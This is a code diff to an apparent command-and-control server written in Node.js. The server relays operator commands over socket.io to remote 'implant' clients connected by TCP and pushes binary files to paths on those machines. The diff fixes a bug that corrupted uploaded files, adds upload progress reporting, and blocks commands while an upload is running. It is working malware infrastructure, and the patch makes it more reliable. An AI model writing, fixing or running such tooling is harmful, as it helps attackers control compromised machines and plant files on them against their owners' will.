@@ -39,25 +39,24 @@ const io = socketIo(server, {
 });
 
 /**
- * Write a chunk to the implant TCP socket and wait for drain if the kernel buffer fills.
- * Avoids stalling or OOM when pushing multi‑MiB uploads in one write().
+ * Write one chunk to the implant TCP socket. Uses write() callback so we never
+ * double-send when the return value is false (data is already queued internally;
+ * re-calling write() on 'drain' would duplicate bytes and corrupt the file).
  */
 function writeTcpChunkRespectingDrain(tcpSocket, chunk) {
   return new Promise((resolve, reject) => {
-    function tryWrite() {
-      try {
-        if (tcpSocket.destroyed) {
-          reject(new Error('TCP socket closed'));
-          return;
-        }
-        const ok = tcpSocket.write(chunk);
-        if (ok) resolve();
-        else tcpSocket.once('drain', tryWrite);
-      } catch (e) {
-        reject(e);
-      }
+    if (tcpSocket.destroyed) {
+      reject(new Error('TCP socket closed'));
+      return;
     }
-    tryWrite();
+    try {
+      tcpSocket.write(chunk, (err) => {
+        if (err) reject(err);
+        else resolve();
+      });
+    } catch (e) {
+      reject(e);
+    }
   });
 }
 
@@ -66,6 +65,7 @@ async function streamBinaryUploadToImplant(tcpSocket, fileBuffer, onProgress) {
   const sizeBuf = Buffer.allocUnsafe(8);
   sizeBuf.writeBigUInt64LE(BigInt(total), 0);
   await writeTcpChunkRespectingDrain(tcpSocket, sizeBuf);
+  if (typeof onProgress === 'function') onProgress(0, total);
   const CHUNK = 256 * 1024;
   let sent = 0;
   while (sent < total) {
@@ -1083,7 +1083,8 @@ function createTcpServer() {
           connectedAt: new Date(),
           lastSeen: new Date(),
           active: true,
-          sessionId: uuidv4()
+          sessionId: uuidv4(),
+          tcpUploadInProgress: false
         };
         
         clients.set(clientId, clientInfo);
@@ -1149,6 +1150,7 @@ function createTcpServer() {
             const pu = client.pendingUpload;
             client.pendingUpload = null;
             const requester = pu.requesterSocket;
+            client.tcpUploadInProgress = true;
             const pushUploadResult = (okMsg, isError) => {
               const session = clientSessions.get(clientId) || [];
               session.push({ timestamp: new Date(), type: 'response', content: okMsg });
@@ -1183,6 +1185,9 @@ function createTcpServer() {
               .catch((e) => {
                 const errMsg = `Upload failed: ${e.message}`;
                 pushUploadResult(errMsg, true);
+              })
+              .finally(() => {
+                client.tcpUploadInProgress = false;
               });
             continue;
           }
@@ -1512,6 +1517,12 @@ io.on('connection', (socket) => {
     
     if (client && client.socket && client.active) {
       try {
+        if (client.tcpUploadInProgress) {
+          socket.emit('commandError', {
+            error: 'Binary upload to this client is in progress. Wait until it finishes before sending commands.'
+          });
+          return;
+        }
         // Handle special shortcut resolution command
         if (typeof command === 'string' && command.trim().toLowerCase() === 'resolveshortcuts') {
           io.emit('commandResponse', { 
@@ -1696,7 +1707,7 @@ io.on('connection', (socket) => {
       if (!client || !client.socket || !client.active) {
         return socket.emit('uploadError', { clientId, error: 'Client not found or offline' });
       }
-      if (client.pendingUpload) {
+      if (client.pendingUpload || client.tcpUploadInProgress) {
         return socket.emit('uploadError', { clientId, error: 'Another upload is already in progress' });
       }
       if (!remotePath || !fileBase64) {
